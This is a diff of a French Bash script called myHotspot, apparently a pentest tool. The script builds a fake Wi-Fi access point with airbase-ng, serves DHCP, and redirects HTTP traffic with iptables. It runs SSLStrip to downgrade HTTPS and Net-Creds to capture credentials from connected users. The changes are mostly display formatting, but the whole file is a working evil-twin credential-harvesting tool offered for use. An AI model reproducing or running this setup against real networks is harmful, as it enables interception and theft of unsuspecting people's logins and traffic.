@@ -1,9 +1,12 @@
 #!/bin/bash
 # Copyright (C) 2015 - Nyzo
-# myHotspot - version 1.1
+# myHotspot - version 1.0
 
 #Initialisation paramètres console
-warn="\e[40;1;31m" #rouge
+txtrst="\e[0m"  #Réinitialisation du texte, blanc
+warn="\e[0;31m" #Alerte, rouge
+q="\e[0;32m"    #Question, vert
+info="\e[0;33m" #Info, jaune
 
 init_fn() {
 
@@ -15,12 +18,14 @@ iptables -X
 iptables -t nat -X
 iptables -t mangle -X
 
+unset SESSION_MANAGER
+
 #Vérification des installations
 #DHCP
 if [[ ! -x /usr/sbin/dhcpd ]];then
   echo -e "$warn\nVous devez installer isc-dhcp-server"
   sleep 1
-  echo -e "Voulez-vous le faire maintenant ? (y/n)"
+  echo -e "$q\nVoulez-vous le faire maintenant ? (y/n)"
   read var
   if [[ $var == y ]];then
     apt-get install isc-dhcp-server
@@ -32,7 +37,7 @@ fi
 if [[ ! -x /etc/net-creds ]];then
   echo -e "$warn\nVous devez installer net-creds"
   sleep 1
-  echo -e "Voulez-vous le faire maintenant ? (y/n)"
+  echo -e "$q\nVoulez-vous le faire maintenant ? (y/n)"
   read var
   if [[ $var == y ]];then
     cd /etc
@@ -45,23 +50,23 @@ fi
 
 # Initialisation
 echo
-echo " - myHotspot - Version 1.0  - Par Nyzo - "
+echo " - myHotspot - Version 1.1  - Par Nyzo - "
 echo
 route -n -A inet | grep UG
 echo
-echo
-echo "Entrez l'IP connectée à un réseau, listée ci-dessus :"
+echo -e -n "$q\nEntrez l'IP connectée à un réseau, listée ci-dessus : $txtrst\n"
 read -e gatewayip
-echo -n "Entrez l'interface connectée à un réseau, listée ci-dessus. Sélectionnez l'interface associée à l'IP précédemment choisie : "
+echo -e -n "$q\nEntrez l'interface connectée à un réseau, listée ci-dessus. Sélectionnez l'interface associée à l'IP précédemment choisie : $txtrst\n"
 read -e internet_interface
-echo -n "Entrez l'interface que vous souhaitez utiliser pour créer le point d'accès wifi. L'interface ne doit pas être connectée à internet :"
+echo -e -n "$q\nEntrez l'interface que vous souhaitez utiliser pour créer le point d'accès wifi. L'interface ne doit pas être connectée à internet : $txtrst\n"
 read -e fakeap_interface
-echo -n "Entrez le nom que vous souhaitez donner au point d'accès wifi (Ex: FreeWifi) :"
+echo -e -n "$q\nEntrez le nom que vous souhaitez donner au point d'accès wifi (Ex: FreeWifi) : $txtrst\n"
 read -e ESSID
 airmon-ng start $fakeap_interface
 fakeap=$fakeap_interface
 fakeap_interface="mon0"
 setup_fn
+echo -e -n "$txtrst\n"
 }
 
 setup_fn() {
@@ -87,13 +92,13 @@ range 10.0.0.20 10.0.0.50;
 }" > /pentest/wireless/myhotspot/dhcpd.conf
 
 # Création du point d'accès wifi
-echo "[+] Configuration du point d'accès wifi"
+echo -e "$info\n[+]Configuration du point d'accès wifi $warn"
 xterm -xrm '*hold: true' -geometry 75x15+1+0 -T "myHotspot - $ESSID - $fakeap - $fakeap_interface" -e airbase-ng --essid "$ESSID" -c 1 $fakeap_interface & fakeapid=$!
 disown
 sleep 3
 
 # Tables
-echo "[+] Configurations des tables et des redirections"
+echo -e "$info\n[+]Configurations des tables et des redirections $warn"
 ifconfig lo up
 ifconfig at0 up &
 sleep 1
@@ -113,7 +118,7 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
 sleep 3
 
 # DHCP
-echo "[+] Configuration et démarrage DHCP"
+echo -e "$info\n[+]Configuration et démarrage DHCP $warn"
 chmod 777 /var/run/
 touch /var/run/dhcpd.pid
 chmod 777 /var/run/dhcpd.pid
@@ -122,27 +127,21 @@ xterm -xrm '*hold: true' -geometry 75x20+1+100 -T DHCP -e dhcpd -f -d -cf "/pent
 disown
 sleep 3
 
-# Sslstrip
-echo "[+] Configuration et démarrage de SSLStrip"
-sslstrip -f -p -k 10000 & sslstripid=$!
+# SSLStrip
+echo -e "$info\n[+]Configuration et démarrage de SSLStrip $warn"
+xterm -geometry 125x30+5+500 -T SSLStripLog -e python /usr/bin/sslstrip --favicon -p -k 10000 --write sslstrip.log & sslstripid=$!
 sleep 2
 
-#SSLStrip Log
-echo "[+] Configuration et démarrage de SSLStrip Log"
-tail -f sslstrip.log & sslstriplogid=$!
-sleep 2
-
-#Net-Creds
-echo "[+] Configuration et démarrage de Net-Creds"
+# Net-Creds
+echo -e "$info\n[+]Configuration et démarrage de Net-Creds $warn"
 xterm -xrm '*hold: true' -geometry 125x30+1+600 -T "Net-Creds" -e python /etc/net-creds/net-creds.py -i at0 & netcredsid=$!
 disown
 sleep 2
 
 clear
-echo "[+] Initialistion terminée"
-echo
-echo "Si vous n'avez pas aperçu d'erreur(s), le script est fonctionnel et vous devriez voir apparaître le wifi que vous avez créé"
-echo "IMPORTANT : Pour quitter, pressez q ou appuyez sur Ctrl+C, sinon vous pourriez obtenir des erreurs et des dysfonctionnements."
+echo -e "$info\n[+]Initialistion terminée $txtrst\n"
+echo "> Si vous n'avez pas aperçu d'erreur(s), le script est fonctionnel et vous devriez voir apparaître le wifi que vous avez créé"
+echo -e "$txtrst>$warn IMPORTANT$txtrst: Pour quitter, pressez q ou appuyez sur Ctrl+C, sinon vous pourriez obtenir des erreurs et des dysfonctionnements. $txtrst\n"
 read QUIT
 if [ $QUIT = "q" ] ; then
 exit_fn
@@ -153,21 +152,19 @@ fi
 
 # Nettoyage
 exit_fn() {
-echo "[+] Arrêt des processus et réinitialisation des protocoles, interfaces et réseaux."
+echo -e "$info\n[+] Arrêt des processus et réinitialisation des protocoles, interfaces et réseaux."
 
+echo -e "$info\n[+] Airbase-ng (fake ap) stoppé $warn"
 kill ${fakeapid}
-echo "[+] Airbase-ng (fake ap) stoppé"
+echo -e "$info[+] DHCP stoppé $warn"
 kill ${dchpid}
-echo "[+] DHCP stoppé"
+echo -e "$info[+] SSLStrip stoppé $warn"
 kill ${sslstripid}
-echo "[+] SSLStrip stoppé"
-kill ${sslstriplogid}
-echo "[+] SSLStrip log stoppé"
+echo -e "$info[+] Net-Creds stoppé $info\n"
 kill ${netcredsid}
-echo "[+] Net-Creds stoppé"
 sleep 1
 
-echo "[+] Airmon-ng stoppé"
+echo -e "[+] Airmon-ng stoppé $txtrst\n"
 sleep 1
 echo
 echo "0" > /proc/sys/net/ipv4/ip_forward
@@ -175,7 +172,7 @@ iptables --flush
 iptables --table nat --flush
 iptables --delete-chain
 iptables --table nat --delete-chain
-echo "[+] iptables restaurée"
+echo -e "$info\n[+] iptables restaurée $txtrst\n"
 sleep 1
 airmon-ng stop $fakeap_interface
 airmon-ng stop $fakeap
@@ -183,13 +180,10 @@ sleep 1
 echo
 ifconfig $internet_interface up
 /etc/init.d/networking stop && /etc/init.d/networking start
-echo "[+] Redémarrage du système internet"
-
-echo -e "\e[0m"
-echo "[+] Redéfinition des paramètres de la console"
-
+echo -e "$info\n[+] Redémarrage du système internet"
 echo "[+] Nettoyage et restauration terminé !"
 echo "[+] Merci d'utiliser myHotspot et à bientôt !"
+echo -e -n "\e[0m" #Réinitialisation du texte
 sleep 3
 clear
 exit
